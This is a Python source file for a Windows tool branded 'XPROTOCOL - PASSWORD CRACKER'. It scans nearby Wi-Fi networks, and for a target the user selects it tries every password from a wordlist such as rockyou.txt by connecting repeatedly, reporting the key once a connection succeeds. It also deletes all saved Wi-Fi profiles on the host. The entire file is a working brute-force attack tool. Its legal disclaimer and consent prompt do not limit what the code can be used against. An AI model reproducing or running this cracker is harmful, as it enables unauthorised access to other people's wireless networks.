import subprocess
import time
import os
import sys
import threading
from datetime import datetime

try:
    import pywifi
    from pywifi import const
    from colorama import init, Fore, Back, Style
except ImportError:
    print("Installing required libraries...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pywifi", "colorama"])
    import pywifi
    from pywifi import const
    from colorama import init, Fore, Back, Style

# Initialize colorama
init(autoreset=True)

class WindowsWiFiTester:
    def __init__(self):
        self.wifi = pywifi.PyWiFi()
        self.iface = self.wifi.interfaces()[0] if self.wifi.interfaces() else None
        self.scanned_networks = []
        self.is_testing = False
        self.current_attempt = 0
        self.total_passwords = 0
        self.found_password = None
        
    def print_banner(self):
        """Print the tool banner"""
        banner = f"""
{Fore.CYAN}
╔══════════════════════════════════════════════════════════════╗
║                   XPROTOCOL - PASSWORD CRACKER               ║
║   _______________________________________________________    ║
║                        BY - Prashant                         ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""
        print(banner)
    
    def check_admin_privileges(self):
        """Check if running as administrator"""
        try:
            # Try to create a file in system directory
            test_file = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'temp.test')
            with open(test_file, 'w') as f:
                f.write('test')
            os.remove(test_file)
            return True
        except:
            return False
    
    def scan_networks(self):
        """Scan for available WiFi networks"""
        if not self.iface:
            print(f"{Fore.RED}❌ No WiFi interface found!")
            return []
        
        print(f"{Fore.BLUE}🔍 Scanning for WiFi networks...")
        
        try:
            self.iface.scan()
            time.sleep(5)  # Wait for scan to complete
            
            scan_results = self.iface.scan_results()
            networks = []
            
            for result in scan_results:
                ssid = result.ssid if result.ssid else "Hidden Network"
                bssid = result.bssid
                signal = result.signal
                
                # Get security type
                auth = "Open"
                if result.akm:
                    if const.AKM_TYPE_WPA2PSK in result.akm:
                        auth = "WPA2-PSK"
                    elif const.AKM_TYPE_WPAPSK in result.akm:
                        auth = "WPA-PSK"
                    elif const.AKM_TYPE_WPA2Enterprise in result.akm:
                        auth = "WPA2-Enterprise"
                
                networks.append({
                    'ssid': ssid,
                    'bssid': bssid,
                    'signal': signal,
                    'auth': auth
                })
            
            # Remove duplicates by SSID
            seen = set()
            unique_networks = []
            for net in networks:
                if net['ssid'] not in seen:
                    seen.add(net['ssid'])
                    unique_networks.append(net)
            
            self.scanned_networks = sorted(unique_networks, key=lambda x: x['signal'], reverse=True)
            return self.scanned_networks
            
        except Exception as e:
            print(f"{Fore.RED}❌ Scan failed: {e}")
            return []
    
    def display_networks(self):
        """Display available networks"""
        if not self.scanned_networks:
            print(f"{Fore.YELLOW}⚠️  No networks found or scan failed!")
            return False
        
        print(f"\n{Fore.GREEN}📶 Found {len(self.scanned_networks)} WiFi networks:")
        print(f"{Fore.WHITE}{'='*80}")
        print(f"{Fore.CYAN}{'#':<3} {'SSID':<30} {'Signal':<8} {'Security':<12} {'BSSID':<15}")
        print(f"{Fore.WHITE}{'='*80}")
        
        for i, network in enumerate(self.scanned_networks, 1):
            signal_bars = "▮" * max(1, min(5, (network['signal'] + 100) // 20))
            print(f"{Fore.YELLOW}{i:<3} {Fore.WHITE}{network['ssid'][:28]:<30} {signal_bars:<8} {network['auth']:<12} {network['bssid'][:14]:<15}")
        
        print(f"{Fore.WHITE}{'='*80}")
        return True
    
    def test_connection(self, ssid, password):
        """Test if password works for the given SSID"""
        try:
            # Create a profile
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)  # WPA2
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password
            
            # Remove all profiles and add new one
            self.iface.remove_all_network_profiles()
            tmp_profile = self.iface.add_network_profile(profile)
            
            # Try to connect
            self.iface.connect(tmp_profile)
            time.sleep(3)  # Wait for connection
            
            # Check connection status
            if self.iface.status() == const.IFACE_CONNECTED:
                self.iface.disconnect()
                return True
            else:
                self.iface.disconnect()
                return False
                
        except Exception as e:
            return False
    
    def password_generator(self, file_path, start_line=0):
        """Generator function to yield passwords from file"""
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                # Skip to start line if resuming
                for _ in range(start_line):
                    next(f, None)
                
                for line_num, line in enumerate(f, start_line + 1):
                    password = line.strip()
                    if password:  # Skip empty lines
                        yield line_num, password
                        
        except FileNotFoundError:
            print(f"{Fore.RED}❌ Password file not found: {file_path}")
        except Exception as e:
            print(f"{Fore.RED}❌ Error reading password file: {e}")
    
    def run_password_attack(self, network_index, password_file, max_passwords=1000000):
        """Run the password attack on selected network"""
        if network_index < 1 or network_index > len(self.scanned_networks):
            print(f"{Fore.RED}❌ Invalid network selection!")
            return
        
        target_network = self.scanned_networks[network_index - 1]
        ssid = target_network['ssid']
        
        if target_network['auth'] in ['WPA2-Enterprise', 'WPA-Enterprise']:
            print(f"{Fore.RED}❌ Enterprise networks are not supported!")
            return
        
        print(f"\n{Fore.YELLOW}🎯 Target: {Fore.CYAN}{ssid}")
        print(f"{Fore.YELLOW}🔒 Security: {Fore.CYAN}{target_network['auth']}")
        print(f"{Fore.YELLOW}📁 Password file: {Fore.CYAN}{password_file}")
        print(f"{Fore.YELLOW}⏰ Started at: {Fore.CYAN}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{Fore.WHITE}{'='*80}")
        
        self.is_testing = True
        self.current_attempt = 0
        self.found_password = None
        
        # Count total passwords first
        try:
            with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
                self.total_passwords = sum(1 for _ in f)
            print(f"{Fore.BLUE}📊 Total passwords to test: {self.total_passwords:,}")
        except:
            self.total_passwords = 0
        
        start_time = time.time()
        tested_passwords = set()
        
        # Start progress thread
        progress_thread = threading.Thread(target=self.show_progress, daemon=True)
        progress_thread.start()
        
        try:
            for line_num, password in self.password_generator(password_file):
                if not self.is_testing:
                    break
                
                if len(password) < 8 or len(password) > 63:
                    continue
                
                # Skip duplicates
                if password in tested_passwords:
                    continue
                tested_passwords.add(password)
                
                self.current_attempt = line_num
                
                # Show current attempt
                if line_num % 100 == 0:
                    print(f"{Fore.WHITE}Attempt {line_num:,}: Trying '{password}'")
                
                # Test the password
                if self.test_connection(ssid, password):
                    self.found_password = password
                    elapsed_time = time.time() - start_time
                    self.show_success(ssid, password, line_num, elapsed_time)
                    self.is_testing = False
                    return True
                
                # Safety limit
                if line_num >= max_passwords:
                    print(f"{Fore.YELLOW}⚠️  Reached maximum password limit ({max_passwords})")
                    break
                    
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}⏹️  Attack interrupted by user")
        
        elapsed_time = time.time() - start_time
        self.show_failure(ssid, elapsed_time)
        self.is_testing = False
        return False
    
    def show_progress(self):
        """Show progress during attack"""
        while self.is_testing and not self.found_password:
            if self.current_attempt > 0 and self.total_passwords > 0:
                progress = (self.current_attempt / self.total_passwords) * 100
                print(f"{Fore.BLUE}📊 Progress: {self.current_attempt:,}/{self.total_passwords:,} ({progress:.1f}%)", end='\r')
            time.sleep(1)
    
    def show_success(self, ssid, password, attempts, elapsed_time):
        """Show success message"""
        print(f"\n\n{Fore.GREEN}{'='*80}")
        print(f"{Fore.GREEN}✅ SUCCESS! Password found!")
        print(f"{Fore.GREEN}{'='*80}")
        print(f"{Fore.WHITE}SSID: {Fore.CYAN}{ssid}")
        print(f"{Fore.WHITE}Password: {Fore.GREEN}{password}")
        print(f"{Fore.WHITE}Attempts: {Fore.YELLOW}{attempts:,}")
        print(f"{Fore.WHITE}Time elapsed: {Fore.YELLOW}{elapsed_time:.2f} seconds")
        print(f"{Fore.WHITE}Passwords per second: {Fore.YELLOW}{(attempts/elapsed_time):.2f}")
        print(f"{Fore.GREEN}{'='*80}")
    
    def show_failure(self, ssid, elapsed_time):
        """Show failure message"""
        print(f"\n\n{Fore.RED}{'='*80}")
        print(f"{Fore.RED}❌ Password not found!")
        print(f"{Fore.RED}{'='*80}")
        print(f"{Fore.WHITE}SSID: {Fore.CYAN}{ssid}")
        print(f"{Fore.WHITE}Attempts: {Fore.YELLOW}{self.current_attempt:,}")
        print(f"{Fore.WHITE}Time elapsed: {Fore.YELLOW}{elapsed_time:.2f} seconds")
        print(f"{Fore.RED}{'='*80}")
    
    def main(self):
        """Main application loop"""
        self.print_banner()
        
        # Check admin privileges
        if not self.check_admin_privileges():
            print(f"{Fore.RED}⚠️  Warning: Running without administrator privileges!")
            print(f"{Fore.YELLOW}Some WiFi operations may require admin rights.")
            print(f"{Fore.YELLOW}Run as Administrator for best results.\n")
        
        # Check WiFi interface
        if not self.iface:
            print(f"{Fore.RED}❌ No WiFi interface detected!")
            print(f"{Fore.YELLOW}Make sure your WiFi adapter is enabled.")
            return
        
        print(f"{Fore.GREEN}✅ WiFi interface: {self.iface.name()}")
        
        while True:
            try:
                # Scan networks
                networks = self.scan_networks()
                if not self.display_networks():
                    continue
                
                # Get target network
                try:
                    choice = input(f"\n{Fore.YELLOW}Enter network number to test (0 to rescan, Q to quit): ").strip()
                    if choice.lower() == 'q':
                        break
                    if choice == '0':
                        continue
                    network_choice = int(choice)
                except ValueError:
                    print(f"{Fore.RED}❌ Please enter a valid number!")
                    continue
                
                # Get password file
                password_file = input(f"{Fore.YELLOW}Enter path to password file (e.g., rockyou.txt): ").strip()
                if not os.path.exists(password_file):
                    print(f"{Fore.RED}❌ Password file not found!")
                    continue
                
                # Confirm action
                target_ssid = self.scanned_networks[network_choice - 1]['ssid']
                confirm = input(f"{Fore.RED}⚠️  Test against '{target_ssid}'? (y/N): ").strip().lower()
                if confirm != 'y':
                    continue
                
                # Run attack
                self.run_password_attack(network_choice, password_file)
                
                # Ask to continue
                again = input(f"\n{Fore.YELLOW}Test another network? (y/N): ").strip().lower()
                if again != 'y':
                    break
                    
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}👋 Exiting...")
                break
            except Exception as e:
                print(f"{Fore.RED}❌ Error: {e}")
                continue

if __name__ == "__main__":
    # Legal disclaimer
    print(f"{Fore.RED}{'!'*80}")
    print(f"{Fore.RED}⚠️  LEGAL DISCLAIMER: This tool is for EDUCATIONAL and AUTHORIZED testing only!")
    print(f"{Fore.RED}⚠️  Only use on networks you OWN or have EXPLICIT WRITTEN PERMISSION to test!")
    print(f"{Fore.RED}⚠️  Unauthorized access to computer networks is ILLEGAL!")
    print(f"{Fore.RED}{'!'*80}")
    
    consent = input(f"\n{Fore.YELLOW}Do you understand and accept responsibility? (yes/NO): ").strip().lower()
    if consent != 'yes':
        print(f"{Fore.YELLOW}Exiting...")
        sys.exit(0)
    
    # Run the tool
    tester = WindowsWiFiTester()
    tester.main()
